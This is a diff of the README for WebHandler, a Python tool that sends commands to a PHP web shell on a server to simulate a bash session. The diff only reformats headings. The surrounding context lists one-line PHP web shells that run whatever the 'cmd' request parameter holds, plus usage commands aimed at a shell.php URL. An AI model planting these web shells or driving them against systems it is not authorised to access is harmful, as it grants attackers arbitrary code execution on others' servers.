@@ -2,7 +2,7 @@ WebHandler - Command controller for PHP system functions
 ---
 ![My image](http://s12.postimage.org/t5ujo2om5/Untitled_1.png)
 
-### Info: ###
+### Info ###
 ---
 WebHandler is a command controller to handle PHP _program execution functions_ like system, passthru, exec and etc...
 The script tries to simulate Linux bash as it works from CLI.
@@ -14,7 +14,7 @@ It sends requests to the server through urllib/urllib2 [Python][] modules.
     - `<?php exec($_POST['cmd']); ?>`
     - `<?php passthru($_REQUEST['cmd']); ?>`
 
-### Usage: ###
+### Usage ###
 ---
 * --url is a positional argument withing GET and POST requests:
     - python webhandler.py --url http://www.mywebsite.com/shell.php?cmd=
@@ -23,7 +23,7 @@ It sends requests to the server through urllib/urllib2 [Python][] modules.
     - python webhandler.py -u http://www.mywebsite.com/shell.php?cmd= --proxy http://127.0.0.1:8080
 
 
-__Requirements__
+### Requirements
 ---
 If your [Python][]'s version < 2.7.x, then [argparse][] **is required**.
 To install it run: `sudo apt-get install python-setuptools && sudo easy_install argparse` **OR** `sudo pip --install argparse`
@@ -34,7 +34,7 @@ This module it used to provide elaborate line editing and history features
 [git][] **is optional**.
 This allows for the project to be kept up-to-date
 
-__Links__
+### Links
 ---
 [Wiki][] 
 
